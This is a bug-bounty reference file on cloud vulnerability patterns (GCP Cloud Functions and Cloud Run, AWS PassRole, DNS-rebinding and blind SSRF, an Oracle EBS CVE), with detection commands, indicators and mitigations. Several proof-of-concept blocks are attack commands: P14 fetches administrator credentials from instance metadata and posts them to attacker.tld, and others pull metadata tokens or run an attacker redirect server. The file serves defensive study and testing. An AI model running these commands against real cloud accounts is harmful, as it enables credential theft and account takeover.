# Bug Bounty Patterns 2024-2026 — cloud-security

## Overview

Post-2023 cloud vulnerability patterns from Tenable ConfusedFunction research, GCP Security
Bulletins 2025, Datadog Cloud Security Study 2025, SonicWall 2025 Cyber Threat Report (452%
SSRF spike), HackingTheCloud, and CVE-2025-61882 (Oracle EBS). Last validated: 2026-04.
Emit findings via `../schemas/finding.json`.

## Pattern Index

| #   | Pattern                                                      | Severity | Primary Source                             |
|-----|--------------------------------------------------------------|----------|--------------------------------------------|
| P11 | ConfusedFunction — GCP Cloud Function SA privilege escalation | Critical | Tenable 2024                               |
| P12 | Cloud Run image-access bypass (pre-2025-01-28)               | Critical | GCP Security Bulletin 2025                 |
| P13 | Compute-instance IAM + network-tag lateral chain             | High     | Multi-cloud research 2024-2025             |
| P14 | `AWSMarketplaceFullAccess` → full admin via EC2 role         | Critical | Datadog Cloud Security Study 2025          |
| P15 | SSRF via DNS Rebinding (TOCTOU)                              | Critical | SonicWall 2025 · Intigriti SSRF guide      |
| P16 | Oracle E-Business Suite SSRF + CRLF → RCE                    | Critical | CVE-2025-61882                             |
| PD  | Blind-SSRF Surfacing via HTTP Redirect Loops                 | High     | PortSwigger Top 10 2025                    |

---

## Patterns

### P11. ConfusedFunction — GCP Cloud Function SA Escalation

- **CVE / Source:** Tenable Research (2024) — "ConfusedFunction".
- **Summary:** Any principal with `cloudfunctions.functions.update` can cause the function to be rebuilt, which runs as the Cloud Build *default* service account — a broadly-privileged identity with access to Cloud Storage, Artifact Registry, and Secret Manager across the project.
- **Affected surface:** GCP projects using Cloud Functions 1st-gen or Cloud Build default pipeline; any role that grants `cloudfunctions.functions.update` (including custom).
- **Detection (automated):**
  ```bash
  gcloud functions list --format=json | jq -r '.[].name' | while read fn; do
    gcloud functions get-iam-policy "$fn" --format=json
  done
  # Enumerate identities with *.functions.update
  gcloud projects get-iam-policy "$PROJECT" --flatten='bindings[].members' \
    --format='table(bindings.role,bindings.members)' | grep -Ei 'functions|editor|owner'
  ```
  Flag when `roles/cloudfunctions.developer` or a custom role grants `functions.update` to non-admins; check whether Cloud Build default SA still has `roles/editor`.
- **Exploitation / PoC:** Redeploy the function with tampered source that uses the build-time SA to enumerate / exfiltrate cross-service resources; no direct call to the SA's credentials is needed — the build container runs as it.
- **Indicators:** Cloud Audit Log shows `google.cloud.functions.v1.CloudFunctionsService.UpdateFunction` followed by Cloud Build jobs accessing unrelated resources.
- **Mitigation:** Use Cloud Build custom SA (minimum privilege) per build pool; migrate to Functions 2nd-gen / Cloud Run; remove `roles/editor` from the default CB SA.
- **Cross-refs:** CWE-269; MITRE T1078.004; related → P12, P14.

### P12. Cloud Run Image-Access Bypass (Pre-2025-01-28)

- **CVE / Source:** GCP Security Bulletin (fix landed 2025-01-28).
- **Summary:** Prior to the fix, Cloud Run permitted container image pulls from Artifact Registry / GCR without an explicit IAM check on the caller, enabling cross-tenant image access if an attacker could deploy a Cloud Run service referencing another tenant's private image.
- **Affected surface:** Organizations still running un-patched Anthos / private GKE / older Cloud Run installs that mirror the pre-fix behavior; environments restored from pre-Jan-2025 backups.
- **Detection (automated):**
  - Verify Cloud Run is at or past the Jan 28 2025 fix (GCP managed is auto-patched; Anthos requires version check).
  - Attempt to deploy a Cloud Run service referencing an image in a different project — success = vulnerable.
- **Exploitation / PoC:**
  ```bash
  gcloud run deploy pwn --region=us-central1 \
    --image=gcr.io/VICTIM_PROJECT/private:latest --platform=managed
  ```
- **Indicators:** Audit log entries of `run.googleapis.com` services referencing images in projects where caller has no Artifact Registry reader.
- **Mitigation:** Enforce VPC-SC perimeters around Artifact Registry; require explicit image-access bindings; enable Binary Authorization.
- **Cross-refs:** CWE-284; related → P11.

### P13. Compute-Instance IAM + Network-Tag Lateral Chain

- **CVE / Source:** 2024-2025 multi-cloud research (Rhino Security Labs GCP repo; Medium write-ups).
- **Summary:** A principal with `compute.instances.setServiceAccount` or `setTags` can (a) attach a higher-privileged SA to a new compute instance, or (b) add network tags that punch through firewall rules protecting internal admin surfaces.
- **Affected surface:** AWS EC2 IAM roles, GCP Compute SA attachment, Azure VM managed identities; security-group / firewall rules keyed on tag.
- **Detection (automated):**
  ```bash
  # GCP
  gcloud projects get-iam-policy "$P" --flatten='bindings[].members' \
    --format='table(bindings.role,bindings.members)' \
    | grep -E 'compute.instanceAdmin|compute.instances.setServiceAccount|setTags'

  # AWS (similar concept via iam:PassRole on ec2:RunInstances)
  aws iam simulate-principal-policy --policy-source-arn "$USER_ARN" \
    --action-names iam:PassRole ec2:RunInstances
  ```
- **Exploitation / PoC:**
  ```bash
  gcloud compute instances create pwn --zone=us-central1-a \
    --service-account="$PRIV_SA@$P.iam.gserviceaccount.com" \
    --scopes=cloud-platform --tags=admin-allowlist
  gcloud compute ssh pwn --command='curl -s http://metadata/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"'
  ```
- **Indicators:** New VM with admin SA attached by non-admin; firewall-bypassing tag added by dev-role principal.
- **Mitigation:** Forbid SA attachment via org policy; IAM Conditions tying `setTags` to allow-list; network-level segmentation not reliant on tags alone.
- **Cross-refs:** MITRE T1078.004, T1531; CWE-269.

### P14. `AWSMarketplaceFullAccess` → Full Admin via EC2

- **CVE / Source:** Datadog Cloud Security Study 2025.
- **Summary:** The AWS-managed policy `AWSMarketplaceFullAccess` quietly grants `ec2:RunInstances` and `iam:PassRole`, allowing the holder to launch an EC2 instance with a pre-existing high-priv instance profile (e.g., `AdministratorRole`) and retrieve its credentials from IMDS — full account takeover.
- **Affected surface:** AWS accounts with `AWSMarketplaceFullAccess` attached to non-admin users (common in procurement-focused roles); any pre-built role with `PassRole` + `RunInstances`.
- **Detection (automated):**
  ```bash
  aws iam list-entities-for-policy --policy-arn arn:aws:iam::aws:policy/AWSMarketplaceFullAccess
  # Then audit each user/group/role for its normal blast radius.
  # Also enumerate PassRole chains with Cloudsplaining or PMapper.
  ```
- **Exploitation / PoC:**
  ```bash
  aws ec2 run-instances --image-id ami-xxxxx --instance-type t3.micro \
    --iam-instance-profile Name=AdministratorInstanceProfile --user-data \
    "#!/bin/bash
     curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/AdministratorRole \
       | curl -X POST -d@- https://attacker.tld/c"
  ```
- **Indicators:** `RunInstances` event from a principal with no baseline EC2 usage; instance profile elevation; IMDS hit followed by egress to unrelated host.
- **Mitigation:** Replace `AWSMarketplaceFullAccess` with a scoped customer-managed policy; enforce `iam:PassRole` conditions; enforce IMDSv2 + hop-limit=1; use SCPs to deny PassRole to admin roles.
- **Cross-refs:** [Rhino AWS privesc catalog](https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation); CWE-269, CWE-732.

### P15. SSRF via DNS Rebinding (TOCTOU)

- **CVE / Source:** SonicWall 2025 Cyber Threat Report (452% SSRF increase); Intigriti Advanced SSRF guide 2024.
- **Summary:** Server validates a URL's hostname, resolves it once to a public IP, passes validation, then on the *actual* fetch resolves it again — attacker-controlled DNS returns a private IP (169.254.169.254, 10.0.0.0/8, ::1) on the second resolution. Classic TOCTOU against cloud metadata endpoints.
- **Affected surface:** Webhook validators, image fetchers, PDF/HTML renderers, LLM-tool browsers, any `url=`-accepting endpoint that performs its own DNS resolution.
- **Detection (automated):**
  - Use a rebinding service (`rbndr.us`, `whonow`, self-hosted `dnsbin`) that returns `8.8.8.8` on first A query and `169.254.169.254` on second.
  - Submit the rebinding hostname to the target; observe whether an IMDS token / GCP metadata response is exfiltrated or echoed.
  - Time-based oracle: measure response delta between `127.0.0.1` (usually blocked) and the rebinding host (sometimes allowed).
- **Exploitation / PoC:**
  ```bash
  # Host a 2-second TTL A-record that alternates between 1.2.3.4 and 169.254.169.254
  curl -X POST https://target.tld/fetch -d url=http://rebind.attacker.tld/latest/meta-data/iam/security-credentials/
  ```
- **Indicators:** Successful fetch of `169.254.169.254`, `metadata.google.internal`, or `fd00:ec2::254`; DNS log shows two resolutions of same hostname to different IPs within seconds.
- **Mitigation:** Pin the resolved IP between validation and fetch (single resolution); block RFC1918 / link-local / cloud-metadata IPs at egress; enforce IMDSv2 (requires PUT for token).
- **Cross-refs:** CWE-918, CWE-367; OWASP API7:2023; related → P16.

### P16. Oracle E-Business Suite SSRF + CRLF → RCE (CVE-2025-61882)

- **CVE / Source:** CVE-2025-61882 (disclosed October 2025); exploited as 0-day by Cl0p / Graceful Spider since August 2025.
- **Summary:** Pre-auth SSRF in Oracle EBS combined with CRLF injection in forwarded request headers allows an attacker to pivot from the EBS server to internal services and, via an additional CRLF-inserted line, execute commands against a back-end service that trusts EBS.
- **Affected surface:** Internet-exposed Oracle EBS 12.2.x (and earlier 12.1.x with back-ports) prior to the October 2025 CPU; especially instances that proxy to internal Oracle WebLogic / SOA Suite.
- **Detection (automated):**
  - Fingerprint EBS banner (`/OA_HTML/`, `/OA_CGI/`) and patch level.
  - Send a probe with a CRLF-laden Host header; observe whether the back-end logs show request splitting.
  - Detect outbound IMDS calls from the EBS host in cloud environments.
- **Exploitation / PoC:** Refer to Oracle CPU notes and public PoCs; do not re-host here.
- **Indicators:** EBS access logs with `%0d%0a` in headers; EBS host outbound connections to IMDS or SMB shares.
- **Mitigation:** Apply Oracle CPU ≥ Oct 2025; remove EBS from internet exposure; egress-filter the EBS host against IMDS and internal management VLANs.
- **Cross-refs:** CWE-918, CWE-93, CWE-78; MITRE T1190.

### PD. Blind-SSRF Surfacing via HTTP Redirect Loops

- **CVE / Source:** PortSwigger Top 10 2025 — blind SSRF visibility technique.
- **Summary:** When SSRF is blind (no response body reflected), chaining HTTP redirect loops through an attacker-controlled server amplifies timing / retry-count differences so the attacker can distinguish internal-reachable IPs from unreachable ones without any data-exfil channel.
- **Affected surface:** Blind-SSRF surfaces common in webhook validators, preview renderers, SSO gateway redirects.
- **Detection (automated):**
  - Host a redirect loop (`Location: https://attacker.tld/next?c=N`) that bounces for N hops before returning 204.
  - Measure total response time / retry count delta between target IPs.
- **Exploitation / PoC:**
  ```python
  # attacker server
  @app.route("/r")
  def r():
      n = int(request.args.get("n","0"))
      if n > 30: return "", 204
      return redirect(f"https://attacker.tld/r?n={n+1}&probe={request.args['probe']}", code=302)
  ```
- **Indicators:** Target behavior reveals redirect chain length; timing histogram bimodal between reachable / unreachable IPs.
- **Mitigation:** Cap redirect follow count at 3; forbid redirects crossing scheme/host; uniform timing on error paths.
- **Cross-refs:** CWE-918; related → P15.

---

## Cross-skill links
- API: SSRF on webhook validators interacts with OAuth ATO — `../../api-security/methodology/bounty_patterns_2024_2026.md`.
- Container: P19 (SA token theft) often follows P11/P14 — `../../container-security/references/bounty_patterns_2024_2026.md`.
- IaC: preventive controls for P11/P14 live in Terraform / OPA rules — `../../iac-security/references/bounty_patterns_2024_2026.md`.
